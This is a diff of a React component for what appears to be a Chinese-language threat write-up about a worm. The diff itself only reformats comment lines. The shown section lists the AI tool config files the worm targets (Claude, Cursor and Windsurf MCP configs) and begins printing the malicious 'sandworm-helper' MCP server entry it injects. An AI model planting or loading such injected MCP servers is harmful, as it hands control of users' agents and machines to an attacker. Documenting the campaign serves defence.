@@ -62,12 +62,12 @@ export default function Post() {
           <h3 className="text-xl font-semibold text-white mt-8">阶段二：MCP 配置注入（T+0）</h3>
           <p>蠕虫扫描 AI 工具配置文件并注入恶意 MCP 服务器：</p>
           <div className="bg-[#1a1a2e] rounded-lg p-4 font-mono text-sm border border-white/10 overflow-x-auto">
-            <p className="text-gray-500">// Targets:</p>
-            <p className="text-gray-500">// ~/.claude/config.json</p>
-            <p className="text-gray-500">// ~/.cursor/mcp.json</p>
-            <p className="text-gray-500">// ~/.windsurf/mcp.json</p>
+            <p className="text-gray-500">{"// Targets:"}</p>
+            <p className="text-gray-500">{"// ~/.claude/config.json"}</p>
+            <p className="text-gray-500">{"// ~/.cursor/mcp.json"}</p>
+            <p className="text-gray-500">{"// ~/.windsurf/mcp.json"}</p>
             <p>&nbsp;</p>
-            <p className="text-gray-500">// Injected config:</p>
+            <p className="text-gray-500">{"// Injected config:"}</p>
             <p>{`{`}</p>
             <p>&nbsp;&nbsp;&quot;mcpServers&quot;: {`{`}</p>
             <p>&nbsp;&nbsp;&nbsp;&nbsp;<span className="text-red-400">&quot;sandworm-helper&quot;</span>: {`{`}</p>
